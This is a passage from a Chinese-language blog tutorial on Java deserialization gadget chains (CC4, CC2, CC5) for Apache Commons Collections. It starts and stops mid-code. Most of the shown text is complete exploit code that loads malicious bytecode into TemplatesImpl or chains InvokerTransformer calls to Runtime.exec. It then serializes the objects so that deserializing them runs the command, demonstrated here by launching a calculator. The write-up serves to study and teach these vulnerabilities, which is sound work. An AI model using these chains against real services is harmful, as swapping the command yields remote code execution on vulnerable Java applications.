<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>但改完会发现还是不行，问题出在：</p><p><img src="/img/CompareError.png" alt="CompareError"></p><p>简单说就是虽然通过<code>add</code>确保了优先队列长度为2，但是引发了新的问题：<code>add</code>直接触发完了这条链子。但之前那条<code>CC3</code>链子中有这么个东西：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br>templates.newTransformer();<br></code></pre></td></tr></table></figure><p><code>_tfactory</code>这东西被<code>transient</code>修饰不能给他赋值，不过好在<code>readObject</code>的时候给他复制了所以让他不为<code>null</code>。这里直接越过了<code>readObject</code>，所以为<code>null</code>直接报错。</p><p>如果把EXP改成这样可以直接弹计算器(但这显然不是我们需要的，因为还没反序列化)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br>       <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br>       templates.newTransformer();  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(chainedTransformer)));  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(<span class="hljs-number">1</span>);  <br> priorityQueue.add(<span class="hljs-number">2</span>);  <br></code></pre></td></tr></table></figure><p>解决方法和前面一样，先把这条链子改成错的，让他<code>add</code>的时候别触发这条链子。<code>add</code>完了再通过反射改回去就行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br><span class="hljs-comment">//        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);  </span><br><span class="hljs-comment">//        tfactoryField.setAccessible(true);  </span><br><span class="hljs-comment">//        tfactoryField.set(templates, new TransformerFactoryImpl());  </span><br><span class="hljs-comment">//        templates.newTransformer();  </span><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));  <span class="hljs-comment">//这里本应是chainedTransformer，但改成了1</span><br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(<span class="hljs-number">1</span>);  <br> priorityQueue.add(<span class="hljs-number">2</span>);  <br>  <span class="hljs-comment">//改完了再通过反射改回去</span><br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">transformingField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);  <br> transformingField.setAccessible(<span class="hljs-literal">true</span>);  <br> transformingField.set(transformingComparator, chainedTransformer);  <br>  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>CC2 这条链实际上是在 CC4 链基础上的修改，目的是避免使用 <code>Transformer</code> 数组。这里和<code>CC4+CB1</code>链子有点像，我是懒狗就直接放EXP了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Anything&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Clac.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(templates);  <br> priorityQueue.add(templates);  <br>  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">transformingField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);  <br> transformingField.setAccessible(<span class="hljs-literal">true</span>);  <br> transformingField.set(transformingComparator, invokerTransformer);  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>入口类是 <code>BadAttributeValueExpException</code> 的 <code>readObject()</code> 方法：</p><p><img src="/img/CC51.png" alt="CC51"></p><p><code>TiedMapEntry</code> 这个类存在 <code>toString()</code> 方法：</p><p><img src="/img/CC52.png" alt="CC52"></p><p>一直很好奇这种链子是怎么找出来的。。拿<code>toString()</code>这种方法来说，用法可能有成百上千个，能在这么多用法中找出能用的也太吊了</p><p>调用了<code>getKey()</code>和<code>getValue()</code>方法,<code>getValue()</code>方法调用了<code>get()</code>方法：</p><p><img src="/img/CC53.png" alt="CC53"></p><p><code>map.get()</code>，这就回到了<code>CC1</code>里<code>Lazymap</code>那条链子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// LazyMap 后半段的 EXPpublic class LazyMapGetEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">lazyGetMethod</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredMethod(<span class="hljs-string">&quot;get&quot;</span>, Object.class);  <br> lazyGetMethod.setAccessible(<span class="hljs-literal">true</span>);  <br> lazyGetMethod.invoke(decorateMap, <span class="hljs-string">&quot;everything!&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里用反射直接调用了<code>get</code>方法弹出计算器。接下来利用<code>TiedMapEntry</code> 类调用 <code>toString()</code>进而调用<code>get</code>方法：</p><p><img src="/img/CC5.png" alt="CC5"></p><p>EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// TiedMapEntry 的 EXP 编写  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br> <span class="hljs-comment">//上面都一样，就是换了个方法触发get方法</span><br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorateMap, <span class="hljs-string">&quot;value&quot;</span>);  <br> tiedMapEntry.toString();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>前面说了入口是 <code>BadAttributeValueExpException</code> 的 <code>readObject()</code> ，<code>new</code>一个之后 给<code>val</code>赋值为<code>TiedMapEntry</code>的实例就行，然后序列化，反序列化时就能触发了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 